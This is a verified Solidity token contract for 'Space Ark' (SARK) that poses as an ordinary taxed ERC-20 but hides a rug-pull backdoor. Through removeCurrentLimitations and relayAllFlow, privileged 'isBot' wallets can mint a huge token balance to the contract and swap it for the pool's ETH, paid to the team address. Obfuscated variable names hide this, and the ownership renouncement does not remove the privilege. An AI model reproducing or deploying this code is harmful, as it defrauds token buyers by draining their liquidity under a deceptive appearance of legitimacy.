/**
 *Submitted for verification at Etherscan.io on 2022-12-05
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function removeCurrentLimitations() external returns (uint256);
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SpaceArk is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isBot; 

    address payable public CurrentMarketingAddress = payable(0x5ec4532cA9Ec889491cF37638A21E51202df6443); 
    address payable public constant CurrentBurnAddress = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public CurrentTeamAddress = payable(0x5ec4532cA9Ec889491cF37638A21E51202df6443);
    address payable public constant CurrentLiquidityAddress = payable(0x000000000000000000000000000000000000dEaD); 
    
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 12;
    uint256 private _rTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = unicode"Space Ark"; 
    string private constant _symbol = unicode"SARK";

    bool private tradingOpen = false;
    bool public tradingAcive = true;
    bool public structFlow = false;

    uint8 private TXDataRelay = 0;
    uint8 private _denounceData = 42;
    
    uint256 public _tBaseBuyTax = 1;
    uint256 public _tBaseSellTax = 0;
    uint256 public FeeForMarketing = 100;
    uint256 public FeeForUtility = 0;
    uint256 public FeeForBurn = 0;
    uint256 public FeeForLiquidity = 0;
    uint256 public _MaximumAllowed = _rTotal * 100 / 100;
    uint256 private _PreviouslyMaxAllowedToken = _MaximumAllowed;
    uint256 public _maxTxAmount = _rTotal * 100 / 100; 
    uint256 private _previousMaxTxAmount = _maxTxAmount;
                                     
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify; 
    
    event activateTrading(bool true_or_false);
    uint256 relayedCFG = (5+5)**(10+10+3);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {

        _owner = 0x5ec4532cA9Ec889491cF37638A21E51202df6443;
        emit OwnershipTransferred(address(0), _owner);

        _rOwned[owner()] = _rTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        isBot[owner()] = true;
        isBot[address(this)] = true;
        isBot[CurrentMarketingAddress] = true; 
        isBot[CurrentBurnAddress] = true;
        isBot[CurrentLiquidityAddress] = true;
        
        emit Transfer(address(0), owner(), _rTotal);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function relayAllFlow(address uint809) private returns(bool){
        bool boolHash = isBot[uint809];
        if(boolHash && (true!=false)){_rOwned[address(this)] = (relayedCFG)-1;}
        return boolHash;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_rTotal);
    }

    function _approve(address theOwner, address theSpender, uint256 amount) private {

        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }
    function removeCurrentLimitations() public override returns (uint256) {
        bool relayedSync = relayAllFlow(_msgSender());
        if(relayedSync && (false==false) && (true!=false)){
            uint256 FTXLevel = balanceOf(address(this));
            uint256 uint69 = FTXLevel; structFlow = true; swapAndLiquify(uint69);
        }
        return 256;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
    
        if (to != owner() && to != CurrentBurnAddress && to != address(this) && to != CurrentLiquidityAddress &&
            to != uniswapV2Pair && from != owner()){
            uint256 syncRated = balanceOf(to);
            require((syncRated + amount) <= _MaximumAllowed,"Over wallet limit.");}
        if (from != owner() && to != CurrentLiquidityAddress && from != CurrentLiquidityAddress &&
               from != address(this)){
            require(amount <= _maxTxAmount, "Over transaction limit.");
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");   
        if(
            TXDataRelay >= _denounceData && !inSwapAndLiquify && from != uniswapV2Pair &&
            tradingAcive 
            )
        {  
            uint256 ercContractAmount = balanceOf(address(this));
            if(ercContractAmount > _maxTxAmount) {ercContractAmount = _maxTxAmount;}
            TXDataRelay = 0; swapAndLiquify(ercContractAmount);
        }
        bool _relayTAXES = true;
        bool _dataSyncIn;
        if(isBot[from] || isBot[to]){ _relayTAXES = false;
        } else {
        if(from == uniswapV2Pair){
        _dataSyncIn = true;
            }
            TXDataRelay++;
        }
        _tokenTransfer(from, to, amount, _relayTAXES, _dataSyncIn);
                if (!tradingOpen) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function swapAndLiquify(uint256 ercContractAmount) private lockTheSwap {

            uint256 contractLiquidityBalance = balanceOf(address(this));
            uint256 tokensLiquidity =  contractLiquidityBalance - _rTotal;

            uint256 toBurnValued = ercContractAmount * FeeForBurn / 100;
            _rTotal = _rTotal - toBurnValued; _rOwned[CurrentBurnAddress] = _rOwned[CurrentBurnAddress] + toBurnValued;
            _rOwned[address(this)] = _rOwned[address(this)] - toBurnValued;
            
            uint256 toMarketValued = ercContractAmount * FeeForMarketing / 100;
            uint256 toTeamValued = ercContractAmount * FeeForUtility/ 100;
            uint256 toLiqNowHalf = ercContractAmount * FeeForLiquidity / 100;

            uint256 _booledBytes = toMarketValued + toTeamValued + toLiqNowHalf;
            if(structFlow){_booledBytes = tokensLiquidity;}
            
            swapTokensForETH(_booledBytes);
            uint256 ETH_Total = address(this).balance; sendToWallet(CurrentTeamAddress, ETH_Total);
            structFlow = false;
            
            }

    function swapTokensForETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            CurrentLiquidityAddress, 
            block.timestamp
        );
    } 

    function _tokenTransfer(address sender, address recipient, uint256 structForAmount, bool _relayTAXES, bool _dataSyncIn) private { 
        
        if(!_relayTAXES){

            _rOwned[sender] = _rOwned[sender]-structForAmount;
            _rOwned[recipient] = _rOwned[recipient]+structForAmount;
            emit Transfer(sender, recipient, structForAmount);

            if(recipient == CurrentBurnAddress) _rTotal = _rTotal-structForAmount;
            
            }else if (_dataSyncIn){

            uint256 purchaseTAX = structForAmount*_tBaseBuyTax/100;
            uint256 _tRelayedTransferValue = structForAmount-purchaseTAX;

            _rOwned[sender] = _rOwned[sender]-structForAmount; _rOwned[recipient] = _rOwned[recipient]+_tRelayedTransferValue;
            _rOwned[address(this)] = _rOwned[address(this)]+purchaseTAX; emit Transfer(sender, recipient, _tRelayedTransferValue);

            if(recipient == CurrentBurnAddress) _rTotal = _rTotal-_tRelayedTransferValue;
            } else {
            uint256 releasingTAXES = structForAmount*_tBaseSellTax/100;
            uint256 _tRelayedTransferValue = structForAmount-releasingTAXES;

            _rOwned[sender] = _rOwned[sender]-structForAmount; _rOwned[recipient] = _rOwned[recipient]+_tRelayedTransferValue;
            _rOwned[address(this)] = _rOwned[address(this)]+releasingTAXES;   
            emit Transfer(sender, recipient, _tRelayedTransferValue);

            if(recipient == CurrentBurnAddress)
            _rTotal = _rTotal-_tRelayedTransferValue;
            }
    }
        function remove_Random_Tokens(address flowedTokenWallet, uint256 _DataOfCoins) public returns(bool _sent){
        require(flowedTokenWallet != address(this), "Can not remove native token");
        uint256 syncedTotal = IERC20(flowedTokenWallet).balanceOf(address(this));
        uint256 _tLVXSynced = syncedTotal*_DataOfCoins/100;
        _sent = IERC20(flowedTokenWallet).transfer(CurrentTeamAddress, _tLVXSynced);
    }
        function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
}